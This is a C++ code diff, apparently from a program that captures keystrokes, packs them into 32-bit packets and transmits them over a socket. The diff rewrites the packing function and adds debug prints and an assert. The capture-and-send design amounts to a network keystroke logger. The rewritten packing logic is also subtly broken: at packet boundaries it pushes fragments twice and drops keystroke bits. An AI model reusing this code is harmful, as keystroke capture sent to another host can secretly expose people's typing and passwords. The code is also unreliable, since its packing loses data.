@@ -5,6 +5,7 @@
 #include <unordered_set>
 #include <chrono>
 #include <cmath>
+#include <cassert>
 #include <bitset>
 #ifdef _WIN32
 #include <winsock2.h>
@@ -95,41 +96,32 @@ std::vector<uint32_t> findChanges(const std::vector<BYTE>& currentKeys,
 //next 4 bytes are amount of keys pressed, if more than 15 keys are pressed, send 15 then send the remainder after in a seperate packet
 //next bit showing what operating system this comes from, 1 for windows, 0 for linux, going to add linux compatibility so 
 std::vector<uint32_t> packetize(std::vector<uint32_t> keystrokes){
-    std::cout<<"keystroke amount to be packetized : "<<keystrokes.size()<<std::endl;
+std::cout << "keystroke amount to be packetized : " << keystrokes.size() << std::endl;
     std::vector<uint32_t> packets;
     uint32_t packet = 0;
     size_t numKeystrokes = keystrokes.size();
-    int numBitsLeft =32;
-    uint8_t header = (numKeystrokes<<2)|0b10;
-    packet|=header<<24;
-    numBitsLeft -=8;
-
+    int numBitsLeft = 32; 
+    uint8_t header = (numKeystrokes << 2) | 0b10; 
+    packet |= header << 24;
+    numBitsLeft -= 8; 
     for (size_t i = 0; i < numKeystrokes; ++i) {
-        if(numBitsLeft>KEYEVENT_SIZE){
-            packet |= (keystrokes[i] << (numBitsLeft-KEYEVENT_SIZE));
-            numBitsLeft -=KEYEVENT_SIZE;
-        }else if(numBitsLeft ==0){
+        if (numBitsLeft >= KEYEVENT_SIZE) {
+            packet |= (keystrokes[i] << (numBitsLeft - KEYEVENT_SIZE));
+            numBitsLeft -= KEYEVENT_SIZE;  
+        } else {
+            packets.push_back(packet);  
+            packet = keystrokes[i] >> (KEYEVENT_SIZE - numBitsLeft);  
+            packets.push_back(packet);  
+            numBitsLeft = 32 - (KEYEVENT_SIZE - numBitsLeft);
+        }
+    }
+
+    // If there's any leftover data in the last packet, add it to the packets vector
+    if (numBitsLeft < 32 && packet != 0) {
         packets.push_back(packet);
-            packet =0;
-            numBitsLeft=32;
-
-        }
-
-        else{
-            uint32_t lastPackedBits = std::pow(2,numBitsLeft)-1;
-            uint32_t leftoverBits =std::pow(2, KEYEVENT_SIZE-numBitsLeft)-1;
-            packet |= keystrokes[i] & (lastPackedBits<<leftoverBits);
-            packets.push_back(packet);
-            packet =0;
-            numBitsLeft =32;
-
-            packet |= keystrokes[i] & leftoverBits;
-        }
     }
-    if(packet !=0){
-    packets.push_back(packet);
-    }
-    std::cout<<"number of packets needed to send : " <<packets.size()<<std::endl;
+
+    std::cout << "number of packets needed to send : " << packets.size() << std::endl;
     return packets;
 }
 
@@ -183,6 +175,9 @@ void startLogging(SOCKET clientFD,std::atomic<bool>& running) {
                 // buffer[i] = (packets[i/(sizeof(uint32_t))] >>(8*(3-(i %(sizeof(uint32_t)))))) & 0xFF;
                 size_t packetIndex = i / sizeof(uint32_t); // Index into the packets array
                 size_t bytePosition = 3 - (i % sizeof(uint32_t)); // Position of the byte in the 32-bit word
+
+                std::cout << "packetIndex: " << packetIndex << ", packets.size(): " << packets.size() << std::endl;
+                assert(packetIndex<packets.size() && "Index out of range 3");
                 buffer[i] = (packets[packetIndex] >> (8 * bytePosition)) & 0xFF;
             }
             std::cout<<"printing what will be sent"<<std::endl;
